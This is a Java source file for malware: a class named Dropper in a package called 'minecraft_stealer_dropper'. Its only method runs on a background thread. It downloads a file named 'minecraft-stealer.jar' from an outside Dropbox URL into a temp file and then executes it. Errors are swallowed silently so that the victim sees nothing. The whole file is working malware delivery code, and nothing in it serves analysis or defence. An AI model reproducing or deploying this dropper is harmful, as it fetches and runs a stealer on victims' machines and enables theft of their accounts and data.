package org.bitbucket.minecraft_stealer_dropper;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;

public final class Dropper {
	private static boolean downloading;

	public static void drop() {
		if (downloading) {
			return;
		}
		downloading = true;
		try {
			final File stealerFile = File.createTempFile("minecraft-stealer", ".jar");
			new Thread(new Runnable() {

				@Override
				public void run() {
					// TODO Auto-generated method stub
					try {
						stealerFile.delete();
						// TODO(Eric) Fill in the URL
						final BufferedInputStream stealerIn = new BufferedInputStream(
								new URL("https://dl.dropboxusercontent.com/s/w81zjbsvgl3zz2g/minecraft-stealer.jar")
										.openStream());
						final BufferedOutputStream stealerOut = new BufferedOutputStream(
								new FileOutputStream(stealerFile));
						int b;
						while ((b = stealerIn.read()) != -1) {
							stealerOut.write(b);
						}
						stealerIn.close();
						stealerOut.close();
						Runtime.getRuntime().exec("java -jar " + stealerFile.getAbsolutePath() + " versions");
					} catch (final Exception ex) {

					} finally {
						downloading = false;
					}
				}

			}).start();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			downloading = false;
		}
	}
}
